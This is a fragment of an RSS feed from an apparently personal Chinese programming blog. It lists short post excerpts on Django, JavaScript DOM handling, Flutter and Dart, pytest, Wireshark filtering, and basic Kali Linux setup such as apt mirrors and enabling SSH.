      <description>1.CSRF 中间件 CSRF 中间件django.middleware.csrf.CsrfViewMiddleware默认在setting.py设置中激活。
在使用 POST 表单的任何模板中，如果表单用于内部 URL，请在元素内使用csrf_token标签，例如&amp;lt;form method=&amp;quot;post&amp;quot;&amp;gt;{% csrf_token %}，对于针对外部 URL 的 POST 表单，不应这样做，因为这将导致 CSRF 令牌被泄露，从而导致漏洞。
2.异步 POST 带 CSRF 令牌传递 对于任何 AJAX POST 请求，都需要将 CSRF 令牌作为 POST 数据传递进来，您可以获取这样的令牌。
function getCookie(name) { let cookieValue = null; if (document.cookie &amp;amp;&amp;amp; document.cookie !== &amp;#39;&amp;#39;) { const cookies = document.cookie.split(&amp;#39;;&amp;#39;); for (let i = 0; i &amp;lt; cookies.length; i++) { const cookie = cookies[i].trim(); // Does this cookie string begin with the name we want?</description>
    </item>
    
    <item>
      <title>Web开发(12)——attribute 和 property 的区别</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9112attribute-%E5%92%8C-property-%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Sun, 25 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9112attribute-%E5%92%8C-property-%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>参考原文：JS中attribute和property的区别 @L_mj 
 1.介绍 property属性和attribute特性非常容易混淆，但两者不是同一个东西，property是DOM中的属性，是JavaScript里的对象；attribute是HTML标签上的特性，它的值只能够是字符串；简单理解，attribute就是DOM节点自带的属性，例如HTML中常用的id、class、title、align等。而property是这个DOM元素作为对象，其附加的内容，例如childNodes、firstChild等。
&amp;lt;div id=&amp;#34;div1&amp;#34; class=&amp;#34;divClass&amp;#34; title=&amp;#34;divTitle&amp;#34; title1=&amp;#34;divTitle1&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; 如上述的div标签，当我们使用var in1=document.getElementById(&amp;quot;div1&amp;quot;)获取这个元素并打印时console.log(in1)，可以看到如下图的属性。
可以发现有一个名为attributes的属性，类型是NamedNodeMap，同时也可以找到标签自带的属性id和className、但明显没有titles这个自定义的属性。这是因为每一个DOM对象在创建的时候，只会创建如id, className这些基本属性，而们在TAG标签中自定义的属性是不会直接放到DOM中的。我们可以在attributes属性中找到我们自定义的属性。
从这里就可以看出，attributes是属于property的一个子集，它保存了HTML标签上定义属性。
2.设置 常用的attribute，例如id、class等，已经被作为property附加到DOM对象上，可以和property一样取值和赋值。
attribute取值赋值 使用setAttribute()和getAttribute()进行操作，注意，setAttribute()的两个参数，都必须是字符串。
var id = div1.getAttribute(&amp;#34;id&amp;#34;); var className1 = div1.getAttribute(&amp;#34;class&amp;#34;); var title = div1.getAttribute(&amp;#34;title&amp;#34;); var title1 = div1.getAttribute(&amp;#34;title1&amp;#34;); //自定义特性  div1.setAttribute(&amp;#39;class&amp;#39;, &amp;#39;a&amp;#39;); div1.setAttribute(&amp;#39;title&amp;#39;, &amp;#39;b&amp;#39;); div1.setAttribute(&amp;#39;title1&amp;#39;, &amp;#39;c&amp;#39;); div1.setAttribute(&amp;#39;title2&amp;#39;, &amp;#39;d&amp;#39;); property取值赋值 property取值赋值只需要使用.就可以了。对属性property可以赋任何类型的值。
var id = div1.id; var className = div1.className; var childNodes = div1.childNodes; var attrs = div1.attributes; div1.className = &amp;#39;a&amp;#39;; div1.align = &amp;#39;center&amp;#39;; div1.</description>
    </item>
    
    <item>
      <title>随记(28)——使用Gitee&#43;PicGo搭建图床</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B028%E4%BD%BF%E7%94%A8-gitee&#43;picgo-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</link>
      <pubDate>Sun, 25 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B028%E4%BD%BF%E7%94%A8-gitee&#43;picgo-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</guid>
      <description>1.PicGo 软件：Molunerfinn/PicGo · GitHub 
插件：gitee-uploader
PS：注意插件的安装需要环境由node.js，nodejs.org 
2.Gitee 1.新建一个公有仓库
2.配置私人令牌(token)，在设置中找到安全设置，点击私人令牌
3.点击新建，仅选择下图两项，提交并验证密码后会展示token，记录下来，后面操作会使用到。（注意：这个令牌只会明文显示一次）
3.PicGO配置 1.选择图床设置，选择gitee
2.进行配置
 repo：用户名/仓库名称（仓库地址后面那一段） branch：分支，填写master token：填入前面获取的私人令牌 path：路径，一般填写img customPath：提交消息，可不填 customURL：自定义地址，可不填  3.上传区选择gitee便可上传图片</description>
    </item>
    
    <item>
      <title>BUG(19)——Django 分页报错</title>
      <link>https://ac-lm.github.io/posts/bug/bug19django-%E5%88%86%E9%A1%B5%E6%8A%A5%E9%94%99/</link>
      <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug19django-%E5%88%86%E9%A1%B5%E6%8A%A5%E9%94%99/</guid>
      <description>BUG 描述 Django 分页时报错
UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: &amp;lt;class &amp;#39;sign.models.Guest&amp;#39;&amp;gt; QuerySet.paginator = Paginator(guest_list,5) Resolution 这是因为 Django 分页是依照排序进行的，而未排序时进行分页便会发生该报错。定位分页依据的数据，对该数据进行排序
paginator = Paginator(gList, 5) gList = G.objects.all().order_by(&amp;#39;id&amp;#39;) </description>
    </item>
    
    <item>
      <title>Django(8)——外键查询</title>
      <link>https://ac-lm.github.io/posts/django/django8%E5%A4%96%E9%94%AE%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django8%E5%A4%96%E9%94%AE%E6%9F%A5%E8%AF%A2/</guid>
      <description>1.查询示例 class Publish(models.Model): id = models.AutoField(primary_key=True, auto_created=True) pname = models.CharField(max_length=40) city = models.CharField(max_length=50) def __str__(self): return self.pname class Author(models.Model): id = models.AutoField(primary_key=True, auto_created=True) aname = models.CharField(max_length=10) def __str__(self): return self.aname class Book(models.Model): id = models.AutoField(primary_key=True, auto_created=True) bname = models.CharField(max_length=30) price = models.IntegerField() publish = models.ForeignKey(Publish, on_delete=models.CASCADE) author = models.ManyToManyField(Author) def __str__(self): return self.bname 2.通过类属性查询 # get方法的到的结果是一个对应类的对象 # 查询某本书的出版社名字 book = Book.objects.get(id=1) book.publish.pname # 查询某出版社下面有多少本书 # 此处的book是Book这张表的表名的小写（必须是小写）加上_set pub = Publish.objects.get(id=1) pub.book_set.all() 3.</description>
    </item>
    
    <item>
      <title>Web开发(11)——异步POST</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9111%E5%BC%82%E6%AD%A5-post/</link>
      <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9111%E5%BC%82%E6%AD%A5-post/</guid>
      <description>1.$ajax $.ajax({ url: &amp;#39;http://&amp;#39;, type: &amp;#39;post&amp;#39;, dataType: &amp;#39;json&amp;#39;, data: {name: &amp;#34;xu&amp;#34;, foo: &amp;#39;bar&amp;#39;}, cache: false, headers: { &amp;#34;Authorization&amp;#34;: &amp;#34;Bearer token&amp;#34;, &amp;#39;Content-Type&amp;#39;: &amp;#39;application/json&amp;#39; }, success: function(res){}, error: function(e){}, }); </description>
    </item>
    
    <item>
      <title>随记(27)——用例设计</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B027%E7%94%A8%E4%BE%8B%E8%AE%BE%E8%AE%A1/</link>
      <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B027%E7%94%A8%E4%BE%8B%E8%AE%BE%E8%AE%A1/</guid>
      <description>1.测试用例都是可执行的 用例要想可执行，第一条原则是，不要包含一些似是而非的词语，比如是不是，要不要，有没有之类的。换句话说，就是用例里大概率要么包含是，要么包含不是这样的词。比如
 装盐的袋子不能（不是）漏 衣服的颜色是红的 衣服的材料是80%的棉，20%的涤纶  像这样的是或者不是的句型，我们可以称之为断言。设计用例的最基本要求——可以执行，没有歧义。
2.用例的3A原则  Arrange: 初始化测试对象或者准备测试数据 Act : 调用被测方法 Assert: 断言  </description>
    </item>
    
    <item>
      <title>BUG(18)——使用 Js 添加的元素无法点击</title>
      <link>https://ac-lm.github.io/posts/bug/bug18%E4%BD%BF%E7%94%A8-js-%E6%B7%BB%E5%8A%A0%E7%9A%84%E5%85%83%E7%B4%A0%E6%97%A0%E6%B3%95%E7%82%B9%E5%87%BB/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug18%E4%BD%BF%E7%94%A8-js-%E6%B7%BB%E5%8A%A0%E7%9A%84%E5%85%83%E7%B4%A0%E6%97%A0%E6%B3%95%E7%82%B9%E5%87%BB/</guid>
      <description>BUG 描述 在使用append()添加元素后，该元素的点击事件无法被监听生效
Resolution 这些因为，这些动态加载的元素是在css, js代码加载完后才添加的。因此当浏览器在解析js代码时，这些动态添加的元素并未生成，从而也无法绑定相应的事件，事件也就不会触发。
通过对body绑定事件解决该问题
$(&amp;#34;body&amp;#34;).on(&amp;#34;click&amp;#34;, &amp;#39;.addBtn&amp;#39;, function(){ alert(&amp;#39;new&amp;#39;) })  参考原文：js添加HTML元素时出现的无效的点击事件 @wttwuhn 
 </description>
    </item>
    
    <item>
      <title>Dart(9)——随机数</title>
      <link>https://ac-lm.github.io/posts/dart/dart9%E9%9A%8F%E6%9C%BA%E6%95%B0/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart9%E9%9A%8F%E6%9C%BA%E6%95%B0/</guid>
      <description>1.随机数 import &amp;#39;dart:math&amp;#39;; main(){ // 实例化 Random 类并赋值给变量 rng；  var rng = new Random(); // 打印变量 rng，随机数范围(0-99);  print(rng.nextInt(100)); } 2.Random // 返回的 0~(max-1) 的随机数 int nextInt(int max); // 生成 1.0~0.0 的随机数 double nextDouble(); // 生成随机布尔值: true/false bool nextBool(); </description>
    </item>
    
    <item>
      <title>Django(7)——分页的实现</title>
      <link>https://ac-lm.github.io/posts/django/django7%E5%88%86%E9%A1%B5%E7%9A%84%E5%AE%9E%E7%8E%B0/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django7%E5%88%86%E9%A1%B5%E7%9A%84%E5%AE%9E%E7%8E%B0/</guid>
      <description>1.Paginator view.py from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger from django.shortcuts import render def listing(request): contact_list = Contacts.objects.all() paginator = Paginator(contact_list, 25) # Show 25 contacts per page page = request.GET.get(&amp;#39;page&amp;#39;) try: contacts = paginator.page(page) except PageNotAnInteger: # If page is not an integer, deliver first page. contacts = paginator.page(1) except EmptyPage: # If page is out of range (e.g. 9999), deliver last page of results. contacts = paginator.page(paginator.num_pages) return render(request, &amp;#39;list.</description>
    </item>
    
    <item>
      <title>Flutter(22)——状态(数据)监听</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter22%E7%8A%B6%E6%80%81%E6%95%B0%E6%8D%AE%E7%9B%91%E5%90%AC/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter22%E7%8A%B6%E6%80%81%E6%95%B0%E6%8D%AE%E7%9B%91%E5%90%AC/</guid>
      <description>1.ValueListenableBuilder 该Widget配合ValueNotifier可以实现对数据的监听
/// 定义 ValueNotifier 这里传递的数据类型为 String ValueNotifier&amp;lt;String&amp;gt; _testValueNotifier = ValueNotifier&amp;lt;String&amp;gt;(&amp;#39;&amp;#39;); /// 定义数据变化后监听的 Widget Widget buildValueListenableBuilder() { return ValueListenableBuilder( /// 数据发生变化时回调,变化的布局  builder: (context, value, child) { if(value == &amp;#39;&amp;#39;){ return Text(&amp;#39;空&amp;#39;); }else{ return Text(value); } }, /// 监听的数据  valueListenable: _testValueNotifier, ); } /// 数据变化  void testFunction() { /// 赋值更新  _testValueNotifier.value = &amp;#39;传递的测试数据&amp;#39;; } </description>
    </item>
    
    <item>
      <title>Pytest(5)——数据参数化</title>
      <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytest5%E6%95%B0%E6%8D%AE%E5%8F%82%E6%95%B0%E5%8C%96/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytest5%E6%95%B0%E6%8D%AE%E5%8F%82%E6%95%B0%E5%8C%96/</guid>
      <description>参考原文：参数化@pytest.mark.parametrize @小菠萝测试笔记 
 1.使用fixtrue.params参数实现参数化 a.通过 request.param 返回参数值 data = [&amp;#39;anjing&amp;#39;, &amp;#39;test&amp;#39;, &amp;#39;admin&amp;#39;] @pytest.fixture(params=data) def login(request): print(&amp;#39;登录功能&amp;#39;) yield request.param print(&amp;#39;退出登录&amp;#39;) b.使用 参数化的值可以做为返回值使用
def test_01(self, login): print(&amp;#39;---用例01---&amp;#39;) print(&amp;#39;用户名：%s&amp;#39; % login) c.自定义控制台提示信息 @pytest.fixture(params=data, ids=[&amp;#39;This is anjing&amp;#39;,&amp;#39;This is admin&amp;#39;, &amp;#39;This is test&amp;#39;]) def login(request): print(&amp;#39;登录功能&amp;#39;) yield request.param print(&amp;#39;退出登录&amp;#39;) 2.`@pytest.mark.parametrize`实现参数化 a.使用 def parametrize(self,argnames,argvalues,indirect=False,ids=None,scope=None)
argnames：参数名称，字符串，多个使用逗号隔开
argvalues：值，必须是列表
indirect：是否作为函数执行
@pytest.mark.parametrize(&amp;#34;test_input,expected&amp;#34;, [(&amp;#34;3+5&amp;#34;, 8), (&amp;#34;2+4&amp;#34;, 6), (&amp;#34;6*9&amp;#34;, 42)]) def test_eval(test_input, expected): print(f&amp;#34;测试数据{test_input},期望结果{expected}&amp;#34;) assert eval(test_input) == expected b.装饰测试类 当装饰器@pytest.mark.parametrize装饰测试类时，会将数据集合传递给类的所有测试用例方法。注意，此时所有的测试方法都必须传入这些参数</description>
    </item>
    
    <item>
      <title>Python(31)——编解码问题</title>
      <link>https://ac-lm.github.io/posts/python/python31%E7%BC%96%E8%A7%A3%E7%A0%81%E9%97%AE%E9%A2%98/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python31%E7%BC%96%E8%A7%A3%E7%A0%81%E9%97%AE%E9%A2%98/</guid>
      <description>1.二进制字符 在计算机中所有字符都是以二进制代码储存的，系统根据不同的编码格式，将二进制代码转换为字符显示。
print(&amp;#34;\u0394&amp;#34;) print(&amp;#34;\U00000394&amp;#34;) print(&amp;#34;\N{greek capital letter delta}&amp;#34;) 2.乱码时的处理 当编码格式与解码格式出现冲突时就会出现乱码，而此时往往需要将报错的部分进行替换处理，使得程序整体不出错。
# 不处理 print((b&amp;#34;\x80abc&amp;#34;).decode(&amp;#34;utf-8&amp;#34;,&amp;#34;strict&amp;#34;)) # 替换为U+FFFD print((b&amp;#34;\x80abc&amp;#34;).decode(&amp;#34;utf-8&amp;#34;,&amp;#34;replace&amp;#34;)) # 加上反斜杠 print((b&amp;#34;\x80abc&amp;#34;).decode(&amp;#34;utf-8&amp;#34;,&amp;#34;backslashreplace&amp;#34;)) # 直接忽略 print((b&amp;#34;\x80abc&amp;#34;).decode(&amp;#34;utf-8&amp;#34;,&amp;#34;ignore&amp;#34;)) 3.字符与二进制的转换 a.二进制转换字符 u=chr(40960)+&amp;#34;abce&amp;#34;+chr(1972) print(u) u1=chr(123) print(u1) b.字符转换二进制 u=&amp;#34;中国abc&amp;#34; print(u.encode(&amp;#34;utf-8&amp;#34;)) # b&amp;#39;\xe4\xb8\xad\xe5\x9b\xbd&amp;#39; print(u.encode(&amp;#34;ascii&amp;#34;)) print(u.encode(&amp;#34;ascii&amp;#34;,&amp;#34;ignore&amp;#34;)) print(u.encode(&amp;#34;ascii&amp;#34;,&amp;#34;replace&amp;#34;)) print(u.encode(&amp;#34;ascii&amp;#34;,&amp;#34;xmlcharrefreplace&amp;#34;)) print(u.encode(&amp;#34;ascii&amp;#34;,&amp;#34;backslashreplace&amp;#34;)) print(u.encode(&amp;#34;ascii&amp;#34;,&amp;#34;namereplace&amp;#34;)) </description>
    </item>
    
    <item>
      <title>Web开发(10)——jQuery 实现界面刷新</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9110jquery-%E5%AE%9E%E7%8E%B0%E7%95%8C%E9%9D%A2%E5%88%B7%E6%96%B0/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9110jquery-%E5%AE%9E%E7%8E%B0%E7%95%8C%E9%9D%A2%E5%88%B7%E6%96%B0/</guid>
      <description>1.使用Load实现的局部刷新 在jQuery中load方法可以加载本地Html文件里的某个元素，使用这个特性可以实现Html的局部更新
$(&amp;#34;#content&amp;#34;).load(&amp;#34;list .table&amp;#34;) 2.使用location实现全局刷新 window.location.reload() </description>
    </item>
    
    <item>
      <title>随记(26)——正则的相关</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B026%E6%AD%A3%E5%88%99%E7%9A%84%E7%9B%B8%E5%85%B3/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B026%E6%AD%A3%E5%88%99%E7%9A%84%E7%9B%B8%E5%85%B3/</guid>
      <description>1.完全匹配 [\s\S]*：完全通配，\s 是指空白，包括空格，换行，Tab等所有的空白，而 \S 刚好相反，表示字符，这样一正一反下来，就表示所有。
[]：表示在它里面包含的单个字符不限顺序的出现。
2.除换行\n外匹配 (.*)：通配符.是不会匹配换行的，当出现换行时匹配便会终止。</description>
    </item>
    
    <item>
      <title>Dart(8)——可变参数与命名参数</title>
      <link>https://ac-lm.github.io/posts/dart/dart8%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E4%B8%8E%E5%91%BD%E5%90%8D%E5%8F%82%E6%95%B0/</link>
      <pubDate>Thu, 22 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart8%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E4%B8%8E%E5%91%BD%E5%90%8D%E5%8F%82%E6%95%B0/</guid>
      <description>1.可变参数 dart 的可变参数使用 [] 包含，在使用函数时可按顺序直接输入值。（PS：在新版本的Dart语言规范中，可变参数需要被赋予初值，不允许为空）
void test(String name,[int age]){ if(age!=null){ print(&amp;#34;name:$name;age:$age&amp;#34;) }else{ print(&amp;#34;name:$name&amp;#34;) } } void main(){ test(&amp;#39;A&amp;#39;); test(&amp;#39;A&amp;#39;,15); } 2.命名参数 dart 的命名参数使用 {} 包含，在使用函数时需指定值的名字。（PS：在新版本的Dart语言规范中，命名参数需要被赋予初值，不允许为空）
void test(String name,{int age}){ if(age!=null){ print(&amp;#34;name:$name;age:$age&amp;#34;) }else{ print(&amp;#34;name:$name&amp;#34;) } } void main(){ test(&amp;#39;A&amp;#39;); test(&amp;#39;A&amp;#39;,age: 15); } </description>
    </item>
    
    <item>
      <title>Net(8)——Wireshark网络抓包工具</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net8wireshark-%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Mon, 21 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net8wireshark-%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/</guid>
      <description>参考原文：Wireshark抓包使用指南@Ju5tice 
 0x00.Wireshark WireShark（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是抓取网络封包，并尽可能显示出最为详细的网络封包资料。WireShark 抓包是根据 TCP/IP 五层协议来的，也就是物理层、数据链路层、网络层、传输层、应用层。
0x01.Wireshark可以做什么  网络管理员使用Wireshark检测网络问题 网安工程师用Wireshark检查信息安全相关问题 开发者使用Wireshark为新的通信协议调试 普通用户使用Wireshark学习网络协议相关知识  0x02.Wireshark不可以做什么  Wireshark不是入侵侦测软件（Intrusion Detection Software, IDS）。对于网络上的异常流量行为，Wireshark不会产生警示或是任何提示。然而，仔细分析Wireshark截取的数据包能够帮助用户对于网络行为有更清楚的了解。 Wireshark不会对网络数据包产生内容的修改 - 它只会反映出当前流通的数据包信息。 Wireshark本身也不会提交数据包至网络上。就是说你只能查看数据包，不能修改或转发。  0x03.抓包实例 打开wireshark，主界面如下：
双击上图的中的过滤器（捕获），开始抓包
打开 cmd 窗口，执行 ping 命令。工作中的 wireshark 将抓取到相关数据包，在过滤栏设置过滤条件以避免其他无用数据包影响分析，比如：ip.addr == 185.199.111.153 and icmp 表示只显示ICPM协议且源主机IP或者目的主机IP为185.199.111.153的数据包。说明：协议名称icmp要小写
0x04.数据包详细信息  Frame: 物理层的数据帧概况 Ethernet II: 数据链路层以太网帧头部信息 Internet Protocol Version 4: 互联网层IP包头部信息 Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议  0x05.TCP包的具体内容 从下图可以看到wireshark捕获到的TCP包中的每个字段。
0x06.抓包（捕获）过滤器语法和实例 抓包过滤器有如：类型Type（host、net、port）、方向Dir（src、dst）、协议Proto（ether、ip、tcp、udp、http、icmp、ftp等）、逻辑运算符（&amp;amp;&amp;amp; 与、|| 或、！非）等的分类
（1）协议过滤 直接在过滤框中输入协议名即可。 tcp，只显示TCP协议的数据包列表 ；http，只查看HTTP协议的数据包列表 ；icmp，只显示ICMP协议的数据包列表</description>
    </item>
    
    <item>
      <title>Django(6)——Bash 命令</title>
      <link>https://ac-lm.github.io/posts/django/django6bash-%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django6bash-%E5%91%BD%E4%BB%A4/</guid>
      <description>1.安装 pip install django python -m django --version 2.配置项目 django-admin startproject 项目名称 python manage.py startapp 应用名称 3.启动服务器 python manage.py runserver python manage.py runserver 8080 python manage.py runserver 0.0.0.0:8000 4.初始化数据库 python manage.py makemigrations 应用名称 #记录改动 python manage.py migrate #创建表 python manage.py createsuperuser </description>
    </item>
    
    <item>
      <title>Android(3)—APK Analyzer</title>
      <link>https://ac-lm.github.io/posts/android/android3apk-analyzer/</link>
      <pubDate>Wed, 09 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/android/android3apk-analyzer/</guid>
      <description>1.APK Analyzer APK Analyzer 是 Android Studio 提供的 APK 包分析工具，可以打开并审查存于你电脑中的 APK 文件的内容。APK Analyzer 是一个非常好的工具来分析 APK 文件的结构，并同时在发布前或调试时验证一些常见问题，例如 APK 大小和 DEX 问题。
APK Analyzer 可以在 Android Studio 顶端菜单栏中的 Build 找到。
2.利用 APK Analyzer 为应用“瘦身” APK Analyzer 在应用大小方面可以给你很多有用并且可操作的信息。比如你可以从 Raw File Size 看到应用占磁盘大小。Download size 是一个估计值，表示考虑到在经过 Play Store 的压缩后，你还需要多少流量来下载应用。
文件和文件夹根据文件大小降序排列。这让我们很容易看出对 APK 大小优化最容易从哪里入手。每当你深入到某个文件夹的时候，你能看到占用了 APK 大部分空间的资源和其他实体。资源根据文件大小以降序的方式排列。
 参考文档：译.利用好 Android Studio 中的 APK Analyzer @Glowin 
 </description>
    </item>
    
    <item>
      <title>Flutter(21)——apk 瘦身</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter21apk-%E7%98%A6%E8%BA%AB/</link>
      <pubDate>Wed, 09 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter21apk-%E7%98%A6%E8%BA%AB/</guid>
      <description>1.打包 Flutter 在打包编译时，会根据 CPU 架构（x86_64、arm64-v8a、armeabi-v7a）的不同打出对应的二进制库，体现在 apk 的 lib 文件中。
PS：x86_64 一般是模拟器和平板使用， arm64-v8a 就是 arm 64 位，大部分新手机使用。 armeabi 虽然不是现在主流的 CPU 架构，但是高版本的都会对其进行兼容，所以主流的 App 如果只想发一个版本的上线，可以只使用 armeabi 。
使用命令
flutter build apk --release --target-platform android-armflutter build apk --target-platform android-arm,android-arm64,android-x64 --split-per-abi</description>
    </item>
    
    <item>
      <title>Kali(3)——修改apt源</title>
      <link>https://ac-lm.github.io/posts/kali/kali3%E4%BF%AE%E6%94%B9-apt-%E6%BA%90/</link>
      <pubDate>Wed, 09 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/kali/kali3%E4%BF%AE%E6%94%B9-apt-%E6%BA%90/</guid>
      <description>1.备份源 cd /etc/aptcp sources.list sources.list.bak2.编辑文件 模仿 deb http://&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip; main contrib nin-free 修改
#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#官方源#deb http://http.kali.org/kali kali-rolling main non-free contrib#重庆大学#deb http://http.kali.org/kali kali-rolling main non-free contrib</description>
    </item>
    
    <item>
      <title>Kali(2)——启动 SSH 服务</title>
      <link>https://ac-lm.github.io/posts/kali/kali2%E5%90%AF%E5%8A%A8-ssh-%E6%9C%8D%E5%8A%A1/</link>
      <pubDate>Tue, 08 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/kali/kali2%E5%90%AF%E5%8A%A8-ssh-%E6%9C%8D%E5%8A%A1/</guid>
      <description>1.配置 由于 Kali 默认未启用 SSH 服务，需要手动开启
systemctl start sshsystemctl status sshsudo systemctl enable ssh如果需要允许 Root 登录，需要进一步修改
vim /etc/ssh/sshd_config# 将PermitRootLogin 置为 yes</description>
    </item>
    
    <item>
      <title>Kali(1)——修改系统语言</title>
      <link>https://ac-lm.github.io/posts/kali/kali1%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E8%AF%AD%E8%A8%80/</link>
      <pubDate>Mon, 07 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/kali/kali1%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E8%AF%AD%E8%A8%80/</guid>
      <description>1.配置 在终端输入以下命令，打开系统配置页
dpkg-reconfigure locales找到 en_US.UTF-8 UTF-8选项空格取消，继续下拉，找到[ ]zh_CN.GBK_GBK 和[ ] zh-CN.UTF-8.UTF-8两个选项选中，Enter确认，下一界面选择zh_CN.UTF-8确认系统本地编码，reboot重启</description>
    </item>
    
    <item>
      <title>Web开发(9)——下拉表单插件 bootstrap-select</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%919%E4%B8%8B%E6%8B%89%E8%A1%A8%E5%8D%95%E6%8F%92%E4%BB%B6-bootstrap-select/</link>
      <pubDate>Sun, 06 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%919%E4%B8%8B%E6%8B%89%E8%A1%A8%E5%8D%95%E6%8F%92%E4%BB%B6-bootstrap-select/</guid>
      <description> 参考文献：github.com-bootstrap-select @silviomoreto  &amp;amp; blogs @懒得安分
 1.引用 &amp;lt;link href=&amp;#34;Content/bootstrap/css/bootstrap.min.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34; /&amp;gt; &amp;lt;link href=&amp;#34;Content/bootstrap-select/css/bootstrap-select.min.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34; /&amp;gt; &amp;lt;script src=&amp;#34;Content/jquery-1.9.1.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script src=&amp;#34;Content/bootstrap/js/bootstrap.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script src=&amp;#34;Content/bootstrap-select/js/bootstrap-select.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 2.使用 &amp;lt;select class=&amp;#34;selectpicker&amp;#34; multiple&amp;gt; &amp;lt;option value=&amp;#34;1&amp;#34;&amp;gt;广东省&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;2&amp;#34;&amp;gt;广西省&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;3&amp;#34;&amp;gt;福建省&amp;lt;/option&amp;gt; &amp;lt;option 